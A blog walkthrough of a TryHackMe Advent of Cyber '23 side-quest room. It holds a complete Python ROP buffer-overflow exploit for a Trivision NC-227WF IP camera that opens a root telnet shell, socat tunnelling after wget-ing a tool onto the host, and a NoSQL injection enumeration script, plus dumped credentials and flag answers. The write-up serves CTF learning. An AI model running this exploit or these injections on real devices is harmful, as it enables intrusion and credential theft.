---
layout: post
author: nIIk
title: "THM Advent of Cyber '23 Side Quest 2 -- Snowy ARMageddon"
date: 2023-12-28 00:02
keywords: "THM, TryHackMe, Advent of Cyber, christmas, 2023, ROP, ARM, NoSQL, Injection, Camera, Buffer, Overflow, IOT, TCP Tunnel, socat"
categories: [THM]
tags: [CTF, THM, ROP, ARM, NoSQLi, IOT, TCP Tunnel]
---
## Introduction

"Snowy ARMageddon" is a free, **insane** THM challenge, part of the [Advent of Cyber '23 Side Quest](https://tryhackme.com/room/adventofcyber23sidequest) event. This Room is the second of four. During the AoC 23 event, the access to the room had to be gained via a key. The way to obtain the key is covered [here](/posts/thm_aoc_23_sq/#second-side-quest-challenge-key). The challenge is based on a box hosting an IoT service.

## Port Scans

To begin the enumeration of this machine, I started off with a simple stealth scan (as per the Yeti hint) on all ports.

```shell
[niik@tuf504]-[~/] sudo nmap -sS -p- 10.10.34.245
Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-10 11:50 GMT
Nmap scan report for NC-227WF-HD-720P (10.10.34.245)
Host is up (0.030s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
23/tcp    open  telnet
8080/tcp  open  http-proxy
50628/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 20.41 seconds
```

Then, I performed a more detailed scan on all open ports and got the following results:

```shell
[niik@tuf504]-[~/] sudo nmap -sSCV -A -O -T4 -p 22,23,8080,50628 10.10.74.64
Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-10 21:36 GMT
Nmap scan report for 10.10.74.64
Host is up (0.027s latency).

PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3f:df:28:8f:0a:3f:c9:31:f5:aa:e0:cb:29:f5:18:62 (RSA)
|   256 eb:4b:55:e0:8c:52:34:3c:d1:d1:6e:8b:de:4e:7b:ff (ECDSA)
|_  256 b3:6c:cd:12:3d:b6:75:13:8a:e6:7a:1a:bd:98:a3:c4 (ED25519)
23/tcp    open  tcpwrapped
8080/tcp  open  http       Apache httpd 2.4.57 ((Debian))
|_http-title: TryHackMe | Access Forbidden - 403
|_http-server-header: Apache/2.4.57 (Debian)
50628/tcp open  unknown
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.0 302 Redirect
|     Server: Webs
|     Date: Wed Dec 31 19:15:07 1969
|     Pragma: no-cache
|     Cache-Control: no-cache
|     Content-Type: text/html
|     Location: http://NC-227WF-HD-720P:50628/default.asp
|     <html><head></head><body>
|     This document has moved to a new <a href="http://NC-227WF-HD-720P:50628/default.asp">location</a>.
|     Please update your documents to reflect the new location.
|     </body></html>
|   HTTPOptions, RTSPRequest: 
|     HTTP/1.1 400 Page not found
|     Server: Webs
|     Date: Wed Dec 31 19:15:07 1969
|     Pragma: no-cache
|     Cache-Control: no-cache
|     Content-Type: text/html
|     <html><head><title>Document Error: Page not found</title></head>
|     <body><h2>Access Error: Page not found</h2>
|     when trying to obtain <b>(null)</b><br><p>Bad request type</p></body></html>
|   Help, SSLSessionReq: 
|     HTTP/1.1 400 Page not found
|     Server: Webs
|     Date: Wed Dec 31 19:15:22 1969
|     Pragma: no-cache
|     Cache-Control: no-cache
|     Content-Type: text/html
|     <html><head><title>Document Error: Page not found</title></head>
|     <body><h2>Access Error: Page not found</h2>
|_    when trying to obtain <b>(null)</b><br><p>Bad request type</p></body></html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port50628-TCP:V=7.94%I=7%D=12/10%Time=65762F5C%P=x86_64-pc-linux-gnu%r(
SF:GetRequest,192,"HTTP/1\.0\x20302\x20Redirect\r\nServer:\x20Webs\r\nDate
SF::\x20Wed\x20Dec\x2031\x2019:15:07\x201969\r\nPragma:\x20no-cache\r\nCac
SF:he-Control:\x20no-cache\r\nContent-Type:\x20text/html\r\nLocation:\x20h
SF:ttp://NC-227WF-HD-720P:50628/default\.asp\r\n\r\n<html><head></head><bo
SF:dy>\r\n\t\tThis\x20document\x20has\x20moved\x20to\x20a\x20new\x20<a\x20
SF:href=\"http://NC-227WF-HD-720P:50628/default\.asp\">location</a>\.\r\n\
SF:t\tPlease\x20update\x20your\x20documents\x20to\x20reflect\x20the\x20new
SF:\x20location\.\r\n\t\t</body></html>\r\n\r\n")%r(HTTPOptions,154,"HTTP/
SF:1\.1\x20400\x20Page\x20not\x20found\r\nServer:\x20Webs\r\nDate:\x20Wed\
SF:x20Dec\x2031\x2019:15:07\x201969\r\nPragma:\x20no-cache\r\nCache-Contro
SF:l:\x20no-cache\r\nContent-Type:\x20text/html\r\n\r\n<html><head><title>
SF:Document\x20Error:\x20Page\x20not\x20found</title></head>\r\n\t\t<body>
SF:<h2>Access\x20Error:\x20Page\x20not\x20found</h2>\r\n\t\twhen\x20trying
SF:\x20to\x20obtain\x20<b>\(null\)</b><br><p>Bad\x20request\x20type</p></b
SF:ody></html>\r\n\r\n")%r(RTSPRequest,154,"HTTP/1\.1\x20400\x20Page\x20no
SF:t\x20found\r\nServer:\x20Webs\r\nDate:\x20Wed\x20Dec\x2031\x2019:15:07\
SF:x201969\r\nPragma:\x20no-cache\r\nCache-Control:\x20no-cache\r\nContent
SF:-Type:\x20text/html\r\n\r\n<html><head><title>Document\x20Error:\x20Pag
SF:e\x20not\x20found</title></head>\r\n\t\t<body><h2>Access\x20Error:\x20P
SF:age\x20not\x20found</h2>\r\n\t\twhen\x20trying\x20to\x20obtain\x20<b>\(
SF:null\)</b><br><p>Bad\x20request\x20type</p></body></html>\r\n\r\n")%r(H
SF:elp,154,"HTTP/1\.1\x20400\x20Page\x20not\x20found\r\nServer:\x20Webs\r\
SF:nDate:\x20Wed\x20Dec\x2031\x2019:15:22\x201969\r\nPragma:\x20no-cache\r
SF:\nCache-Control:\x20no-cache\r\nContent-Type:\x20text/html\r\n\r\n<html
SF:><head><title>Document\x20Error:\x20Page\x20not\x20found</title></head>
SF:\r\n\t\t<body><h2>Access\x20Error:\x20Page\x20not\x20found</h2>\r\n\t\t
SF:when\x20trying\x20to\x20obtain\x20<b>\(null\)</b><br><p>Bad\x20request\
SF:x20type</p></body></html>\r\n\r\n")%r(SSLSessionReq,154,"HTTP/1\.1\x204
SF:00\x20Page\x20not\x20found\r\nServer:\x20Webs\r\nDate:\x20Wed\x20Dec\x2
SF:031\x2019:15:22\x201969\r\nPragma:\x20no-cache\r\nCache-Control:\x20no-
SF:cache\r\nContent-Type:\x20text/html\r\n\r\n<html><head><title>Document\
SF:x20Error:\x20Page\x20not\x20found</title></head>\r\n\t\t<body><h2>Acces
SF:s\x20Error:\x20Page\x20not\x20found</h2>\r\n\t\twhen\x20trying\x20to\x2
SF:0obtain\x20<b>\(null\)</b><br><p>Bad\x20request\x20type</p></body></htm
SF:l>\r\n\r\n");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (93%), Linux 3.1 - 3.2 (93%), Linux 3.11 (93%), Linux 3.2 - 4.9 (93%), Linux 3.5 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 23/tcp)
HOP RTT      ADDRESS
1   27.40 ms 10.8.0.1
2   27.54 ms 10.10.74.64

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 103.73 seconds
```

The Nmap scan reviews that the service running on port **50628** is a web service redirecting all traffic to domain **NC-227WF-HD-720P**. Therefore, we can add the domain name in `/etc/hosts`:

```shell
[niik@tuf504]-[~/] sudo echo 10.10.34.245 NC-227WF-HD-720P >> /etc/hosts
```

## ROP Attack

From the look of the Web interface on port **50628**, we are dealing with an IoT camera. More specifically _Trivision NC-22WF_.

![ARM Web Service](blog/thm/aoc_23_room2/rop_1.png)

After a quick search, I found out that the firmware for this device is also part of the [ARMX Firmware Emulation Framework](https://github.com/kevthehermit/armx). Furthermore, I found a [writeup](https://no-sec.net/arm-x-challenge-breaking-the-webs/) which explains the exploit of this particular Firmware via ROP attack. Even tho the writeup includes an exploit, the IPs are hardcoded in the shellcode, so before trying to modify the provided exploit, my team and I had a look for other existing exploits. This is when we found the following exploit [https://github.com/3sjay/sploits/blob/main/trivision_nc227wf_expl.py](https://github.com/3sjay/sploits/blob/main/trivision_nc227wf_expl.py).

```python
#!/usr/bin/python
from telnetlib import Telnet
import os, struct, sys, re, socket
import time

##### HELPER FUNCTIONS #####

def pack32(value):
    return struct.pack("<I", value)  # little byte order

def pack16n(value):
    return struct.pack(">H", value)  # big/network byte order

def urlencode(buf):
    s = ""
    for b in buf:
        if re.match(r"[a-zA-Z0-9\/]", b) is None:
            s += "%%%02X" % ord(b)
        else:
            s += b
    return s

##### HELPER FUNCTIONS FOR ROP CHAINING #####

# function to create a libc gadget
# requires a global variable called libc_base
def libc(offset):
    return pack32(libc_base + offset)

# function to represent data on the stack
def data(data):
    return pack32(data)

# function to check for bad characters
# run this before sending out the payload
# e.g. detect_badchars(payload, "\x00\x0a\x0d/?")
def detect_badchars(string, badchars):
    for badchar in badchars:
        i = string.find(badchar)
        while i != -1:
            sys.stderr.write("[!] 0x%02x appears at position %d\n" % (ord(badchar), i))
            i = string.find(badchar, i+1)

##### MAIN #####

if len(sys.argv) != 3:
    print("Usage: expl.py <ip> <port>")
    sys.exit(1)

ip = sys.argv[1]
port = sys.argv[2]

libc_base = 0x40021000

buf = "A" * 284
#buf += "BBBB"

"""
0x40060b58 <+32>:    ldr     r0, [sp, #4]
0x40060b5c <+36>:    pop     {r1, r2, r3, lr}
0x40060b60 <+40>:    bx      lr
"""
ldr_r0_sp = pack32(0x40060b58)

# 0x00033a98: mov r0, sp; mov lr, pc; bx r3;
mov_r0 = pack32(libc_base + 0x00033a98)
system = pack32(0x4006079c)

buf += ldr_r0_sp


buf += "BBBB"
buf += "CCCC"
#buf += "DDDD"
buf += system
#buf += "EEEE"
buf += mov_r0
buf += "telnetd${IFS}-l/bin/sh;#"

"""
buf += "FFFF"
buf += "GGGG"
buf += "HHHH"
"""


buf += "C" * (400-len(buf))

lang = buf

request = "GET /form/liveRedirect?lang=%s HTTP/1.0\n" % lang + \
    "Host: BBBBBBBBBBBB\nUser-Agent: ARM/exploitlab\n\n"

#print request,


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, int(port)))
s.send(request)
s.recv(100)

time.sleep(2)
tn = Telnet(ip, 23)
tn.interact()
```

Executing the script with the host's IP and port then opens a Root reverse shell to the system.

```shell
[niik@tuf504]-[~/] python2 trivision_nc227wf_expl.py 10.10.34.245 50628
```

After some enumeration, the Username and Passwrod for the web login were then located in `/etc/webs/umconfig.txt`:

```shell
# cat /etc/webs/umconfig.txt
cat /etc/webs/umconfig.txt
TABLE=users

ROW=0
name=admin
password=Y3tiStarCur!ouspassword=admin
group=administrators
prot=0
disable=0
```

![Flag 1](blog/thm/aoc_23_room2/arm_1.png)

>What is the content of the first flag?
>- [x] THM{YETI_ON_SCREEN_ELUSIVE_CAMERA_STAR}
{: .prompt-info }

## NoSQLi Attack

>During the event, the filter could be bypasswed by setting an additional path to `/login.php`  
>E.G.: `http://IP:8080/login.php/123`  
>However, the machine was updated since then, forcing userts to use a tunnel.
{: .prompt-info }

To achieve a tunnel, we first need to upload the needed tools. I this case I used [Socat](https://github.com/therealsaumil/static-arm-bins/blob/master/socat-armel-static).

```shell
[niik@tuf504]-[~/] python -m http.server 9090
Serving HTTP on 0.0.0.0 port 9090 (http://0.0.0.0:9090/) ...
10.10.34.245 - - [20/Dec/2023 19:37:43] "GET /socat-armel-static HTTP/1.1" 200 -
```

```shell
# wget http://10.8.122.23:9090/socat-armel-static
wget http://10.8.122.23:9090/socat-armel-static
Connecting to 10.8.122.23:9090 (10.8.122.23:9090)
# mv socat-armel-static socat
mv socat-armel-static socat
# ./socat -V
./socat -V
socat by Gerhard Rieger and contributors - see www.dest-unreach.org
socat version 1.7.3.2 on May  6 2018 18:26:27
   running on Linux version #7 PREEMPT Sun Apr 18 13:52:32 IST 2021, release 2.6.28, machine armv5tejl
...SNIP...
```

After uploading Socat, we need to free port **50628** by killing _webs_:

```shell
# ps | grep webs
ps | grep webs
 4093 root       888 S    grep webs
29363 root      1476 S    webs
# kill 29363
kill 29363
#./socat tcp-listen:50628,fork,reuseaddr tcp:10.10.34.245:8080
./socat tcp-listen:50628,fork,reuseaddr tcp:10.10.34.245:8080
```

Once we kill _webs_ and start the tunnel, we can verify we have access.

```shell
[niik@tuf504]-[~/] curl http://10.10.34.245:50628/login.php
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>401 Unauthorized</title>
</head><body>
<h1>Unauthorized</h1>
<p>This server could not verify that you
are authorized to access the document
requested.  Either you supplied the wrong
credentials (e.g., bad password), or your
browser doesn't understand how to supply
the credentials required.</p>
<hr>
<address>Apache/2.4.57 (Debian) Server at 10.10.34.245 Port 50628</address>
</body></html>
```
While we can access the web service, we now get `401 Unauthorized`. To authorise ourselves, we can use simple HTTP authentication with the credentials from the previous task.

```shell
[niik@tuf504]-[~/] curl http://admin:Y3tiStarCur\!ouspassword\=admin@10.10.34.245:50628/login.php

<!DOCTYPE html>
<html lang="en" class="h-full bg-thm-900">

<head>
  <meta charset="UTF-8" />
  <link rel="icon" type="image/png" href="https://assets.tryhackme.com/img/favicon.png" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>TryHackMe</title>
  <link rel="stylesheet" href="styles.css" />
</head>

<body class="h-full text-white">
  <div class="flex min-h-full flex-col justify-center py-12 sm:px-6 lg:px-8">
    <div class="sm:mx-auto sm:w-full sm:max-w-md">
      <h2 class="mt-6 text-center text-2xl font-bold leading-9 tracking-tight text-gray-100">Cyber Police</h2>
      <img class="mx-auto h-40 w-auto" src="badge.svg" alt="Cyber Police">
    </div>

    <div class="mt-10 sm:mx-auto sm:w-full sm:max-w-[480px]">
      <div class="bg-thm-600 px-6 py-12 shadow-lg shadow-black/40 sm:rounded-lg sm:px-12">
        <form class="space-y-6" action="#" method="POST">
          <div>
            <label for="username" class="block text-sm font-medium leading-6 text-gray-100">Username</label>
            <div class="mt-2">
              <input id="username" name="username" type="text" required class="block w-full rounded-md border-0 py-1.5 text-gray-900 shadow-sm ring-1 ring-inset ring-gray-300 placeholder:text-gray-400 focus:ring-2 focus:ring-inset focus:ring-thm-600 sm:text-sm sm:leading-6">
            </div>
          </div>

          <div>
            <label for="password" class="block text-sm font-medium leading-6 text-gray-100">Password</label>
            <div class="mt-2">
              <input id="password" name="password" type="password" autocomplete="current-password" required class="block w-full rounded-md border-0 py-1.5 text-gray-900 shadow-sm ring-1 ring-inset ring-gray-300 placeholder:text-gray-400 focus:ring-2 focus:ring-inset focus:ring-thm-600 sm:text-sm sm:leading-6">
            </div>
          </div>

          <div>
            <button type="submit" class="flex w-full justify-center rounded-md bg-green-500 px-3 py-1.5 text-sm font-semibold leading-6 uppercase text-thm-800 shadow-sm hover:bg-green-400 focus-visible:outline focus-visible:outline-2 focus-visible:outline-offset-2 focus-visible:outline-green-600">Sign in</button>
          </div>
        </form>

        <!-- Error message -->
              </div>

    </div>
  </div>
</body>

</html>             
```

After some enumeration, my team and I found out that the backend of the login page uses MongoDB. To further enumerate if the database is vulnerable to NoSQLi, we used [MongoMap](https://github.com/Hex27/mongomap), and we found that both **Username** and **Password** fields are vulnerable.

>More about NoSQLi:  
>[https://book.hacktricks.xyz/pentesting-web/nosql-injection](https://book.hacktricks.xyz/pentesting-web/nosql-injection)
{: .prompt-tip }

```shell
[niik@tuf504]-[~/] python3 mongomap.py -u http://admin:Y3tiStarCur\!ouspassword\=admin@10.10.34.245:50628/login.php --method post --data "username=test&password=123"
╔═╗╔═╗╔═══╗╔═╗─╔╗╔═══╗╔═══╗╔═╗╔═╗╔═══╗╔═══╗
║║╚╝║║║╔═╗║║║╚╗║║║╔═╗║║╔═╗║║║╚╝║║║╔═╗║║╔═╗║
║╔╗╔╗║║║─║║║╔╗╚╝║║║─╚╝║║─║║║╔╗╔╗║║║─║║║╚═╝║
║║║║║║║║─║║║║╚╗║║║║╔═╗║║─║║║║║║║║║╚═╝║║╔══╝
║║║║║║║╚═╝║║║─║║║║╚╩═║║╚═╝║║║║║║║║╔═╗║║║───
╚╝╚╝╚╝╚═══╝╚╝─╚═╝╚═══╝╚═══╝╚╝╚╝╚╝╚╝─╚╝╚╝───
By Hex_27
[*] v1.0.0
[+] URL can be reached.


[*] Beginning testing phase.
[*] Testing for param username
[i] Attempting Not-Equals Array (param[$ne]) Injection
[+] username is Not-Equals Array (param[$ne]) Injection injectable!
[i] Attempting Regex Array (param[$regex]) Blind Injection
[i] Attempting Where Always True Function Injection
[*] Basic check failed. The rest of this module may not work.
[i] Attempting Where (Function Javascript Evaluation) Blind Injection (JSONStringify)
[*] Basic check failed. The rest of this module may not work.
[i] Attempting Where Always True Injection
[*] Basic check failed. The rest of this module may not work.
[i] Attempting Where (Functionless String) Blind Injection (JSONStringify)
[*] Basic check failed. The rest of this module may not work.
[+] username is injectible.
[?] Continue testing other parameters? [y/N] y
[*] Testing for param password
[i] Attempting Not-Equals Array (param[$ne]) Injection
[+] password is Not-Equals Array (param[$ne]) Injection injectable!
[i] Attempting Regex Array (param[$regex]) Blind Injection
[i] Attempting Where Always True Function Injection
[*] Basic check failed. The rest of this module may not work.
[i] Attempting Where (Function Javascript Evaluation) Blind Injection (JSONStringify)
[*] Basic check failed. The rest of this module may not work.
[i] Attempting Where Always True Injection
[*] Basic check failed. The rest of this module may not work.
[i] Attempting Where (Functionless String) Blind Injection (JSONStringify)
[*] Basic check failed. The rest of this module may not work.
[+] password is injectible.

[*] Test phase completed.

[+] Vulnerable Parameters:
[+] username
[+] - Not-Equals Array (param[$ne]) Injection
[+] password
[+] - Not-Equals Array (param[$ne]) Injection

[i] Attempting to dump data...
[*] Parameter: username

[*] Attemping dump with Not-Equals Array (param[$ne]) Injection on param username


[+] Not-Equals Array (param[$ne]) Injection for username has retrieved:
[+] 
[+]     For payload: username[$ne]=test&password[$ne]=123
[+] 
[+]     Status code with the injection is different!
[+]     200 => 302
[+] 
[+]     New Cookies:
[+]     PHPSESSID : 4b171cab8ae1398fadf4b9e00d887a2c
[+] 

[*] Parameter: password

[*] Attemping dump with Not-Equals Array (param[$ne]) Injection on param password


[+] Not-Equals Array (param[$ne]) Injection for password has retrieved:
[+] 
[+]     For payload: username[$ne]=test&password[$ne]=123
[+] 
[+]     Status code with the injection is different!
[+]     200 => 302
[+] 
[+]     New Cookies:
[+]     PHPSESSID : 9293888685d8f2f95e26a5048a70a4ec
[+] 
```

After we found the vulnerability, we started enumerating the different users and passwords with the use of [Nosql-MongoDB-injection-username-password-enumeration](https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration). That being said, we did a little modification of the script via the use of Chat-GDB as the original script did not enumerate all usernames.

>The original script stops enumerating a string starting with a certain letter the moment it gets one hit.  
>For example, the script will detect the username `Frostbite` and then move on to usernames starting with **G**.  
>Therefore username `Frosteau` and other usernames starting with **F** will be missed.  
>While the solution underneath is not pretty, it provides a larger list of usernames.

```python
# Exploit Title: Nosql injection username/password enumeration
# Author: Kalana Sankalpa (Anon LK)
# Websites: https://www.widane.com, https://blogofkalana.wordpress.com
# Blogpost: https://blogofkalana.wordpress.com/2019/11/14/nosql-injection-username-and-password-enumeration/

#!/usr/bin/python
import string
import requests
import argparse
import sys
from colorama import Fore

parser = argparse.ArgumentParser()
parser.add_argument("-u", action='store', metavar="URL", help="Form submission url. Eg: http://example.com/index.php")
parser.add_argument("-up", action='store', metavar="parameter", help="Parameter name of the username. Eg: username, user")
parser.add_argument("-pp", action='store', metavar="parameter", help="Parameter name of the password. Eg: password, pass")
parser.add_argument("-op", action='store', metavar="parameters", help="Other paramters with the values. Separate each parameter with a comma(,). Eg: login:Login, submit:Submit")
parser.add_argument("-ep", action='store', metavar="parameter", help="Parameter that need to enumerate. Eg: username, password")
parser.add_argument("-m", action='store', metavar="Method", help="Method of the form. Eg: GET/POST")
args = parser.parse_args()

if len(sys.argv) == 1:
	print(parser.print_help(sys.stderr))
	print(Fore.YELLOW + "\nExample: python " + sys.argv[0] + " -u http://example.com/index.php -up username -pp password -ep username -op login:login,submit:submit -m POST")
	exit(0)
if args.u:
	url = args.u
else:
	print(Fore.RED + "Error: please enter URL with -u. ")
	exit(0)

if args.up:
	userpara = args.up
else:
	print(Fore.RED + "Error: please enter User Parameter with -up.")
	exit(0)

if args.pp:
	passpara = args.pp
else:
	print("Error: Fore.RED + please enter Password Parameter with -pp.")
	exit(0)

if args.ep:
	if args.ep == args.up:
		para1 = userpara
		para2 = passpara
	elif args.ep == args.pp:
		para1 = passpara
		para2 = userpara
	else:
		print(Fore.RED + "Error: please enter the valid parameter that need to enumarate")
		exit(0)
else:
	print(Fore.RED + "Error: please enter the Parameter that need to enumerate with -ep.")
	exit(0)

if args.op:
	otherpara = "," + args.op
else:
	otherpara = ""

if args.m is None:
	print(Fore.RED + "Warning: No method given. Using POST as the method. (You can give the method with -m)")
	
def method(url, para):
	if args.m:
		if args.m[0] == "p" or args.m[0] == "P":
			return requests.post(url, data=para, allow_redirects=False)
		elif args.m[0] == "g" or args.m[0] == "G":
			return requests.get(url, params=para, allow_redirects=False)
		else:
			print(Fore.RED + "Error: Invalid method")
			exit(0)
	else:
		return requests.post(url, data=para, allow_redirects=False)

characters = string.printable
for ch in string.printable:
	
	if ch in "$^&*|.+\?":
		characters = characters.replace(ch, '')
loop = True
finalout = ""
count = 0

def find_username(start_char, userpass):
    for char in characters:
        payload = userpass + char
        para = {para1 + '[$regex]' : "^" + payload + ".*", para2 + '[$ne]' : '1' + otherpara}
        r = method(url, para)

        if r.status_code == 302:
            print(Fore.YELLOW + "Pattern found: " + payload)
            find_username(start_char, payload)

    print(Fore.GREEN + para1 + " found: "  + userpass)
    global count
    global finalout
    finalout +=  userpass + "\n"
    count += 1

for firstChar in characters:
    para = {para1 + '[$regex]' : "^" + firstChar + ".*", para2 + '[$ne]' : '1' + otherpara}
    r = method(url, para)
    if r.status_code != 302:
        print(Fore.MAGENTA + "No pattern starts with '" + firstChar + "'")
        continue

    print(Fore.GREEN + "Pattern found that starts with '" + firstChar + "'")
    find_username(firstChar, firstChar)

if finalout != "":
    print("\n" + str(count) + " " + para1 + "(s) found:")
    print(Fore.RED + finalout)
else:
    print(Fore.RED + "No " + para1 + " found")

for firstChar in characters:
    para = {para1 + '[$regex]' : "^" + firstChar + ".*", para2 + '[$ne]' : '1' + otherpara}
    r = method(url, para)
    if r.status_code != 302:
        print(Fore.MAGENTA + "No pattern starts with '" + firstChar + "'")
        continue

    print(Fore.GREEN + "Pattern found that starts with '" + firstChar + "'")
    userpass = firstChar
    while True:
        found_char = False
        for char in characters:
            payload = userpass + char
            para = {para1 + '[$regex]' : "^" + payload + ".*", para2 + '[$ne]' : '1' + otherpara}
            r = method(url, para)

            if r.status_code == 302:
                print(Fore.YELLOW + "Pattern found: " + payload)
                userpass = payload
                found_char = True

        if not found_char:
            break

    print(Fore.GREEN + para1 + " found: "  + userpass)
    finalout +=  userpass + "\n"

if finalout != "":
    print("\n" + str(count) + " " + para1 + "(s) found:")
    print(Fore.RED + finalout)
else:
    print(Fore.RED + "No " + para1 + " found")
```

- Enumerating all Usernames.

```shell
python nosqli-user-pass-enum.py -u http://admin:Y3tiStarCur\!ouspassword\=admin@10.10.34.245:50628/login.php -up username -pp password -m POST -ep username
```

```
Blizzardson
Frostbite
Frosteau
Frostington
Frostopoulos
Frostova
Grinchenko
Grinchowski
Iciclevich
Northpolinsky
Scroogestein
Sleighburn
Slushinski
Snowbacca
Snowballer
Snownandez
Tinselova
Tinseltooth
```
{: file='Username List'}

- Enumerating all Passwords.

```shell
python nosqli-user-pass-enum.py -u http://admin:Y3tiStarCur\!ouspassword\=admin@10.10.34.245:50628/login.php -up username -pp password -m POST -ep password
```

```
6Ne2HYXUovEIVOEQg2US
7yIcnHu8HC6QCH1MCfHS
advEpXUBKt3bZjk3aHLR
h1y6zpVTOwGYoB95aRnk
jlXUuZKIeCONQQIe92GZ
rCwBuLJPNzmRGExQucTC
tANd8qZ93sFHUBrJhdQj
uwx395sm4GpVfqQ4dUDI
E33v0lTuUVa1ct4sSed1
F6Ymdyzx9C1QeNOcU7FD
HoHoHacked
JZwpMOTmDvVYDq3uSb3t
NlJt6HBZBG3olEphq8gr
ROpPXouppjXNf2pmmT0Q
UZbIt6L41BmLeQJF0gAR
WmLP5OZDiLos16Ie1owB
```
{: file='Password List'}

As we know that `Frosteau` is the main target of the Yeti, we can try using that username with the most **_non-suspicious looking_** password.

```
Frosteau:HoHoHacked
```

![Flag 2](blog/thm/aoc_23_room2/flag2.png)

>What is the content of the `yetikey2.txt` file?
>- [x] 2-K@bWJ5oHFCR8o%whAvK5qw8Sp$5qf!nCqGM3ksaK
{: .prompt-info }

## Credits

This room was completed with joint efforts with the following teammates:

| | |
|-|-|
|[<img src="https://tryhackme-badges.s3.amazonaws.com/steentofte.png" alt="steentofte">](https://tryhackme.com/p/steentofte)|[<img src="https://tryhackme-badges.s3.amazonaws.com/Asborg.png" alt="Asborg">](https://tryhackme.com/p/Asborg)|
|[<img src="https://tryhackme-badges.s3.amazonaws.com/Ethreal.png" alt="Ethreal">](https://tryhackme.com/p/Ethreal)|[<img src="https://tryhackme-badges.s3.amazonaws.com/RohanHax.png" alt="RohanHax">](https://tryhackme.com/p/RohanHax)|